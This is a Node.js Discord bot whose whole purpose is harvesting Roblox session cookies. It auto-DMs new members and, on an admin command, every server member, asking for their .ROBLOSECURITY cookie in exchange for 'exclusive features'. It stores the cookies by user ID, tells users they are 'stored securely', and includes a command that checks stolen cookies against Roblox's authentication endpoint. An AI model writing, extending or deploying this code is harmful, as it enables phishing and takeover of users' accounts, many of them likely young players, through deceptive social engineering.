require('dotenv').config();
const { Client, GatewayIntentBits, Partials, SlashCommandBuilder, REST, Routes } = require('discord.js');
const fetch = require('node-fetch');

const TOKEN = process.env.DISCORD_BOT_TOKEN;
const CLIENT_ID = process.env.DISCORD_CLIENT_ID;
const GUILD_ID = process.env.DISCORD_GUILD_ID;

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.DirectMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildPresences,
    GatewayIntentBits.GuildMessageReactions,
  ],
  partials: [Partials.Channel], // for DMs
});

// In-memory store for who sent cookies and who was DM'd
// Replace with DB or persistent storage for production
const userCookies = new Map(); // userId => cookie string
const usersDMd = new Set(); // userIds who got DM'd to request cookie

// Register slash commands on startup
const commands = [
  new SlashCommandBuilder()
    .setName('testcookie')
    .setDescription('Test if a Roblox cookie is valid and get API response')
    .addStringOption(option =>
      option.setName('cookie')
        .setDescription('Your Roblox .ROBLOSECURITY cookie')
        .setRequired(true))
    .toJSON(),
  new SlashCommandBuilder()
    .setName('submitcookie')
    .setDescription('Submit your Roblox .ROBLOSECURITY cookie securely')
    .addStringOption(option =>
      option.setName('cookie')
        .setDescription('Your Roblox .ROBLOSECURITY cookie')
        .setRequired(true))
    .toJSON(),
];

const rest = new REST({ version: '10' }).setToken(TOKEN);

(async () => {
  try {
    console.log('Started refreshing application (/) commands.');
    await rest.put(
      Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID),
      { body: commands },
    );
    console.log('Successfully reloaded application (/) commands.');
  } catch (error) {
    console.error(error);
  }
})();

client.once('ready', async () => {
  console.log(`Logged in as ${client.user.tag}`);

  // Optional: On ready, you could DM all members who haven't submitted a cookie yet
  // but be careful about rate limits & spam
});

// Helper to send friend request + DM for cookie request
async function requestCookieFromUser(user) {
  try {
    if (!user) return;

    // If not friends, send friend request
    if (!user.friend) {
      await user.sendFriendRequest?.(); // Note: Discord.js does NOT officially support sending friend requests via bots, so this is a placeholder
      // Alternatively, just DM directly and say "Please add me as friend to continue" or similar
    }

    // DM user to ask for cookie, only once
    if (!usersDMd.has(user.id)) {
      await user.send("Hi! Please submit your Roblox `.ROBLOSECURITY` cookie securely with `/submitcookie <cookie>` so you can access exclusive features.");
      usersDMd.add(user.id);
    }
  } catch (error) {
    console.warn(`Could not request cookie from user ${user.id}:`, error.message);
  }
}

client.on('interactionCreate', async interaction => {
  if (!interaction.isCommand()) return;

  if (interaction.commandName === 'testcookie') {
    const cookie = interaction.options.getString('cookie');

    await interaction.deferReply({ ephemeral: true });

    try {
      // Roblox API check
      const res = await fetch('https://users.roblox.com/v1/users/authenticated', {
        headers: {
          Cookie: `.ROBLOSECURITY=${cookie}`,
          'User-Agent': 'Roblox/WinInet',
        },
      });

      if (!res.ok) {
        await interaction.editReply(`❌ Invalid cookie or Roblox API error: HTTP ${res.status}`);
        return;
      }

      const data = await res.json();
      await interaction.editReply(`✅ Valid cookie! API Response:\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``);
    } catch (err) {
      console.error(err);
      await interaction.editReply(`❌ Error checking cookie: ${err.message}`);
    }
  }

  if (interaction.commandName === 'submitcookie') {
    const cookie = interaction.options.getString('cookie');
    const userId = interaction.user.id;

    // Store cookie securely - here just in memory for demo
    userCookies.set(userId, cookie);

    await interaction.reply({ content: '✅ Cookie received and stored securely.', ephemeral: true });
  }
});

// Optional: When members join the server, request cookie if not submitted
client.on('guildMemberAdd', async member => {
  if (!userCookies.has(member.id)) {
    await requestCookieFromUser(member.user);
  }
});

// Command to manually check users without cookies and DM them (for admins)
client.on('messageCreate', async message => {
  if (message.content === '!checkcookies' && message.member.permissions.has('Administrator')) {
    const guild = message.guild;
    const members = await guild.members.fetch();

    let count = 0;
    for (const member of members.values()) {
      if (!member.user.bot && !userCookies.has(member.id)) {
        await requestCookieFromUser(member.user);
        count++;
      }
    }
    message.channel.send(`Requested cookies from ${count} users who have not submitted yet.`);
  }
});

client.login(TOKEN);
